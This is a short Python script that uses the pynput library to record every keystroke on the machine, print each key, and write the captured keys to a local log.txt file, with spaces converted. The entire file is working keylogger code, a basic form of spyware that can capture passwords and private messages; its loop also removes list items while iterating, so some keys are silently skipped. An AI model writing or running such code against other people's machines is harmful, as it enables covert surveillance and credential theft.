import pynput
from pynput import keyboard
import os.path
from os import path

keys = []      


def on_press(key):
    
    keys.append(key)
    writeToFile(keys)
    
    try:
        print('{0} pressed'.format(key.char))
    except AttributeError:
        print('{0} pressed'.format(key))


def writeToFile(keys):
    if os.path.exists('log.txt'):
        mode = 'a' # Append to log.txt if it already exists
    else:
        mode = 'w' # Create a new file (log.txt) if file does not exist
        
    with open('log.txt', mode) as f:
        for key in keys:
            k = str(key).replace("'", "")
                
            if str(key) == 'Key.space':
                f.write(' ')
                keys.remove(key)
                    
            else:
                f.write(k)
                keys.remove(key)

# Collect events until released
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


